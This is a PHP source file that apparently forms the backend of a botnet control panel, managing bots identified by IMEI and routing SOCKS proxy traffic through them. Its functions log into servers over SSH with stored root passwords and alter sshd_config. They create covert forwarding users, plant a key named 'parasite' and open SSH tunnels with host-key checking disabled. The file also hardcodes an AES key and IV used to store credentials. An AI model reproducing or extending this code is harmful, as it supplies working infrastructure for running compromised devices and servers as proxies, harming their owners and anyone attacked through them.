<?php
require_once 'lib/geoip.inc';
require_once 'lib/Net/SSH2.php';
require_once 'lib/Crypt/Hash.php';
require_once 'lib/Crypt/AES.php';
require_once 'lib/Crypt/Random.php';
require_once 'lib/Crypt/Base.php';
require_once 'lib/Math/BigInteger.php';
set_include_path ('lib');

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function prepare_srv_fwd($address='', $user='', $pass=''){
    $result = array();
    if (($address == '') or ($user == '') or ($pass == '')) {
        $result['status'] = 'ERROR';
        $result['status_text'] = 'Not all data has been provided';
        return $result;
    }
    $ssh = new Net_SSH2($address);
    if (!$ssh->login($user, $pass)) {
        $result['status'] = 'ERROR';
        $result['status_text'] = 'Login has been failed';
        return $result;
    }

    # create user credentionals
    $result['fwd_user'] = 'fwd-'.generateRandomString(4);
    $result['fwd_pass'] = generateRandomString(10);

    # change ssh settings
    $fwd_user = $result["fwd_user"];
    $fwd_pass = $result["fwd_pass"];
    $config_string = "Match User $fwd_user
   AllowTcpForwarding yes
   X11Forwarding no
   PermitTunnel yes
   AllowAgentForwarding no
   ForceCommand echo 'This account can only be used for port forward'";
    $ssh->exec("cat >> /etc/ssh/sshd_config << EOF\n$config_string\nEOF");

    # create new user
    $fwd_pass = rtrim($ssh->exec("mkpasswd -m sha-512 -S i//2oCzI -s <<< $fwd_pass"));
    $ssh->exec("useradd -m -p '$fwd_pass' $fwd_user");

    # deploy keys
    $parasite_key = file_get_contents('config/keys/parasite.key.pub');
    $ssh->exec("mkdir /home/$fwd_user/.ssh && chown $fwd_user:$fwd_user /home/$fwd_user/.ssh");
    $ssh->exec("echo '$parasite_key' >> /home/$fwd_user/.ssh/authorized_keys");

    $result['status'] = 'OK';
    # restart ssh
    $ssh->exec('/etc/init.d/ssh restart');
    return $result;
}
function allocatePort($db, $id, $imei){
    # get ssh parameters from db
    $db->where('id', $id);
    $server = $db->get('proxy_servers');

    $srv_ip = $server[0]["ip"];
    $srv_id = $server[0]["id"];
    $srv_user = $server[0]["user"];
    $srv_pass = deCryptString($server[0]["pass"]);

    $fwd_user = $server[0]["forward_user"];
    $fwd_pass = $server[0]["forward_pass"];

    # ssh to server and check port
    $ssh = new Net_SSH2($srv_ip);
    if (!$ssh->login($srv_user, $srv_pass)) {
        $data = array("status" => 0,
            "status_text" => "ssh connection has been not happend");

        $db->where('id', $id);
        $db->update('proxy_servers', $data);
        return false;
    }
    $rnd_port = $allocate_res = 1;
    $retry = 0;
    while((rtrim($allocate_res) != '0') and ($retry < 5)){
        # get random port
        $retry++;
        $rnd_port = rand(20000, 40000);
        $allocate_res = $ssh->exec("netstat -tln | grep $rnd_port && echo 1 || echo 0");
    }
    $select = array('country');
    $db->where('imei', $imei, 'like');
    $row = $db->get('clients', $select);
    if ($row['country'])
        $bot_country = $row['country'];
    else
        $bot_country = '';

    $data = array("imei" => $imei,
        "bot_country" => $bot_country,
        "server" => $srv_id,
        "port" => $rnd_port,
        "connect_time" => time(),
        "status" => 1);
    $db->insert('socks', $data);

    return $rnd_port;
}
#  func for store root passwords as encrypted string in db
function cryptString($str=''){
    $iv = 'kdpelsntnq;spfis';
    $key = 'QrzMwvH7zmVnMwSTWzyLJu#Ck!^f%-UvH7zmVn5Kzu%ks8GST';
    $cipher = new Crypt_AES();
    $cipher->setKey($key);
    $cipher->setIV($iv);
    $encrypted = $cipher->encrypt($str);
    return base64_encode($encrypted);
}
function cryptAES_BASE64($str, $key, $iv){
    $cipher = new Crypt_AES();
    $cipher->setKey($key);
    $cipher->setIV($iv);
    $encrypted = $cipher->encrypt($str);
    return base64_encode($encrypted);
}
function deCryptString($str=''){
    $str = base64_decode($str);
    $iv = 'kdpelsntnq;spfis';
    $key = 'QrzMwvH7zmVnMwSTWzyLJu#Ck!^f%-UvH7zmVn5Kzu%ks8GST';
    $cipher = new Crypt_AES();
    $cipher->setKey($key);
    $cipher->setIV($iv);
    $decrypted = $cipher->decrypt($str);
    return $decrypted;
}
function deCryptAES_BASE64($str, $key, $iv){
    $str = base64_decode($str);
    $cipher = new Crypt_AES();
    $cipher->setKey($key);
    $cipher->setIV($iv);
    $decrypted = $cipher->decrypt($str);
    return $decrypted;
}
function checkSocksConnections($db){
    # get servers
    $servers = $db->get('proxy_servers');
    # get connections
    $connections = $db->get('socks');
    # code...
    foreach ($connections as $connection){
        $server = null;
        foreach ($servers as $s){
            if ($s['id'] == $connection['server']){
                $server = $s;
            }
        }
        $ssh = new Net_SSH2($server['ip']);
        if (!$ssh->login($server['user'], deCryptString($server['pass']))) {
            $result['status'] = 'ERROR';
            $result['status_text'] = 'Login has been failed';

            # login failed then we going to update server information
            $data = array('status' => 0,
                'status_text' => 'Login has been failed');
            $db->where('id', $server['id']);
            $db->update('proxy_servers', $data);

            # and connection status update
            $data = array('status' => 0);
            $db->where('id', $connection['id']);
            $db->update('socks', $data);

            break;
        }
        $port = $connection['port'];
        $res = $ssh->exec("netstat -tln | grep $port && echo 1 || echo 0");
        $data = array('status' => rtrim($res));
        $db->where('id', $connection['id']);
        $db->update('socks', $data);
    }
}
function createBridge($db, $socks_id){
    # get servers
    $servers = $db->get('proxy_servers');
    # get connections
    $db->where('id', $socks_id);
    $connection = $db->get('socks');
    # code...
    $server = null;
    foreach ($servers as $s){
        if ($s['id'] == $connection[0]['server']){
            $server = $s;
        }
    }
    # TODO: do something with it bad code...
    $cmd_clean = "kill $(ps aux | grep '9999:127.0.0.1' | awk '{print $2}')";
    $user = $server['forward_user'];
    # $pass = deCryptString($server['pass']);
    $host = $server['ip'];
    $port = $connection[0]['port'];
    # command for start ssh session tunnel   admin_panel -> ( proxy_server -> client)
    $srv_addr = $_SERVER['SERVER_ADDR'];
    $cmd = "nohup ssh -i config/keys/parasite.key -o 'StrictHostKeyChecking no' -o 'UserKnownHostsFile /dev/null' -N -4 -L $srv_addr:9999:127.0.0.1:$port $user@$host > /tmp/log &";
    exec($cmd_clean,$output,$result);
    exec($cmd,$output,$result);
    //$_SESSION['info'] = "Proxy bridge has been changed successfully!";
    //header('location: proxy.php');
    # just a check ssh bridge
    exec("ps aux | grep '9999:127.0.0.1:$port' | grep -v grep",$output,$result);
    if (isset($output[0])) {
        return true;
    } else {
        return false;
    }
}
